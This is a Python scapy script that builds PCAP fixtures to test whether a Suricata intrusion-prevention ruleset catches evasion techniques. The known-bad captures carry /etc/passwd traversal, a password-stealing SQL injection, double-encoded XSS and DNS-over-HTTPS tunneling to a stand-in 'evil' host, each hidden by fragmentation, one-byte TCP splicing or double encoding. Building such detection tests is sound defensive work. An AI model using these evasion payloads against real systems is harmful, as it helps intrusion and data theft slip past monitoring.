#!/usr/bin/env python3
"""Generate the *adversarial* IPS efficacy PCAP corpus.

Where the sibling `../gen_pcaps.py` carries each attack in a single,
cleanly-framed TCP segment, this corpus reproduces the **evasion**
techniques an attacker uses to slip a payload past a naive
signature-on-the-wire engine, exercising Suricata's reassembly /
normalisation as it would in production:

  * fragmented HTTP   — the request is split across IP fragments, so the
                        attack bytes only exist once the defrag engine
                        reassembles the datagram;
  * session-splice    — the request rides a real 3-way handshake and is
                        then dribbled out one byte per TCP segment, so
                        only stream reassembly recovers the pattern;
  * double-encoded URI— `../` and `<script` are percent-encoded twice
                        (`%252e%252e`, `%253Cscript`) to dodge a single
                        decode pass;
  * DoH tunneling     — DNS exfil tunneled over an HTTPS-style request to
                        a `/dns-query` endpoint with the
                        `application/dns-message` media type.

The companion `adversarial.rules` file alerts on each. Good fixtures use
the same evasion *transport* (fragmented / spliced / singly-encoded /
dns-shaped) but benign content, so the harness still measures a
false-positive rate against the hardened rules.

Committed as binary fixtures (no runtime scapy dependency); re-run only
when the corpus changes:

    python3 gen_adversarial_pcaps.py
"""
import os

from scapy.all import Ether, IP, TCP, UDP, Raw, wrpcap, fragment

HERE = os.path.dirname(os.path.abspath(__file__))

CLIENT = "10.0.0.50"
SERVER = "93.184.216.34"


def fragmented_http(payload, fragsize=16, sport=40010, dport=80):
    """An HTTP request whose IP datagram is split into <=`fragsize`-byte
    fragments. The attack bytes only reassemble in Suricata's defrag
    engine — no single packet carries the full pattern."""
    pkt = IP(src=CLIENT, dst=SERVER) / TCP(sport=sport, dport=dport, flags="PA", seq=1) / Raw(load=payload)
    # fragment() operates on the IP layer; re-add the link header to each
    # fragment so the pcap datalink matches the rest of the corpus.
    return [Ether() / frag for frag in fragment(pkt, fragsize=fragsize)]


def spliced_http(payload, sport=40020, dport=80):
    """A real 3-way handshake followed by `payload` dribbled out one
    byte per segment. Only TCP stream reassembly recovers the pattern;
    no single segment carries more than one byte."""
    isn_c = 1000
    isn_s = 5000
    pkts = [
        Ether() / IP(src=CLIENT, dst=SERVER) / TCP(sport=sport, dport=dport, flags="S", seq=isn_c),
        Ether() / IP(src=SERVER, dst=CLIENT) / TCP(sport=dport, dport=sport, flags="SA", seq=isn_s, ack=isn_c + 1),
        Ether() / IP(src=CLIENT, dst=SERVER) / TCP(sport=sport, dport=dport, flags="A", seq=isn_c + 1, ack=isn_s + 1),
    ]
    data = payload if isinstance(payload, bytes) else payload.encode()
    for i, byte in enumerate(data):
        pkts.append(
            Ether()
            / IP(src=CLIENT, dst=SERVER)
            / TCP(sport=sport, dport=dport, flags="PA", seq=isn_c + 1 + i, ack=isn_s + 1)
            / Raw(load=bytes([byte]))
        )
    return pkts


def http_to(payload, sport=40030, dport=80):
    """A single client->server segment (used for the double-encoded /
    DoH cases, where the evasion is in the bytes, not the framing)."""
    return Ether() / IP(src=CLIENT, dst=SERVER) / TCP(sport=sport, dport=dport, flags="PA", seq=1) / Raw(load=payload)


def http_from(payload, sport=80, dport=40030):
    return Ether() / IP(src=SERVER, dst=CLIENT) / TCP(sport=sport, dport=dport, flags="PA", seq=1) / Raw(load=payload)


# EICAR assembled at runtime so this generator is not itself flagged.
EICAR = (
    "X5O!P%@AP[4\\PZX54(P^)7CC)7}$"
    + "EICAR-STANDARD-ANTIVIRUS-TEST-FILE"
    + "!$H+H*"
)


# --- known-bad: MUST trigger an alert ----------------------------------
BAD = {
    # Fragmented HTTP directory traversal: "/etc/passwd" never appears in
    # a single fragment.
    "bad-frag-http-traversal.pcap": fragmented_http(
        "GET /cgi-bin/page?file=/etc/passwd HTTP/1.1\r\nHost: victim\r\n\r\n"
    ),
    # Fragmented EICAR download (server->client response, fragmented).
    "bad-frag-eicar-download.pcap": [
        Ether() / frag
        for frag in fragment(
            IP(src=SERVER, dst=CLIENT)
            / TCP(sport=80, dport=40011, flags="PA", seq=1)
            / Raw(load=("HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\n\r\n" + EICAR)),
            fragsize=24,
        )
    ],
    # Session-splice SQL injection: one byte per segment over a real
    # handshake; "UNION SELECT" only exists after stream reassembly.
    "bad-splice-tcp-sqli.pcap": spliced_http(
        "GET /search?q=1 UNION SELECT password FROM users-- HTTP/1.1\r\nHost: app\r\n\r\n"
    ),
    # Session-splice directory traversal.
    "bad-splice-tcp-traversal.pcap": spliced_http(
        "GET /static?p=/etc/passwd HTTP/1.1\r\nHost: app\r\n\r\n"
    ),
    # Double-encoded path traversal: %252e%252e%252f decodes to ../ after
    # one pass, evading a single-decode content match on "../".
    "bad-double-encoded-traversal.pcap": http_to(
        "GET /view?f=%252e%252e%252f%252e%252e%252fetc%252fpasswd HTTP/1.1\r\nHost: app\r\n\r\n"
    ),
    # Double-encoded <script> reflected XSS: %253Cscript.
    "bad-double-encoded-xss.pcap": http_to(
        "GET /q?s=%253Cscript%253Ealert(1)%253C%252Fscript%253E HTTP/1.1\r\nHost: app\r\n\r\n"
    ),
    # DoH tunneling (RFC 8484 POST): application/dns-message media type.
    "bad-doh-tunnel-post.pcap": http_to(
        "POST /dns-query HTTP/1.1\r\nHost: doh.evil.example\r\n"
        "Accept: application/dns-message\r\nContent-Type: application/dns-message\r\n"
        "Content-Length: 33\r\n\r\n\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00",
        sport=40040,
    ),
    # DoH tunneling (RFC 8484 GET): base64url-encoded query in ?dns=.
    "bad-doh-tunnel-get.pcap": http_to(
        "GET /dns-query?dns=AAABAAABAAAAAAAAA3d3dwdleGZpbANjb20AAAEAAQ HTTP/1.1\r\n"
        "Host: doh.evil.example\r\nAccept: application/dns-message\r\n\r\n",
        sport=40041,
    ),
}

# --- known-good: must NOT alert ----------------------------------------
GOOD = {
    # Same fragmentation transport, benign request.
    "good-frag-http-benign.pcap": fragmented_http(
        "GET /index.html HTTP/1.1\r\nHost: example.com\r\nAccept: text/html\r\n\r\n",
        sport=40012,
    ),
    # Same splice transport, benign request.
    "good-splice-tcp-benign.pcap": spliced_http(
        "GET /home HTTP/1.1\r\nHost: example.com\r\n\r\n",
        sport=40022,
    ),
    # Singly-encoded URI with a legitimate %2e (e.g. a versioned path):
    # must NOT match the double-encoded %252e signature.
    "good-single-encoded-uri.pcap": http_to(
        "GET /api/v1%2e0/status HTTP/1.1\r\nHost: app\r\n\r\n", sport=40042
    ),
    # Benign JSON API query to a /query endpoint (DoH look-alike path,
    # but application/json and no dns-message / dns-query endpoint).
    "good-api-json-query.pcap": http_to(
        "POST /api/query HTTP/1.1\r\nHost: app\r\nContent-Type: application/json\r\n"
        'Content-Length: 13\r\n\r\n{"q":"select"}',
        sport=40043,
    ),
    # Plain, well-formed DNS over UDP/53 (the legitimate alternative to
    # DoH tunneling).
    "good-dns-udp-normal.pcap": Ether()
    / IP(src=CLIENT, dst="10.0.0.2")
    / UDP(sport=50010, dport=53)
    / Raw(load=b"\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x07example\x03com\x00\x00\x01\x00\x01"),
    # An HTTP path that merely contains the substring "dns" but is not a
    # DoH endpoint and carries no dns-message media type.
    "good-dns-info-page.pcap": http_to(
        "GET /support/dns-info.html HTTP/1.1\r\nHost: example.com\r\n\r\n", sport=40044
    ),
}


def main():
    for name, pkts in {**BAD, **GOOD}.items():
        wrpcap(os.path.join(HERE, name), pkts)
    print(f"wrote {len(BAD)} bad + {len(GOOD)} good adversarial pcaps")


if __name__ == "__main__":
    main()
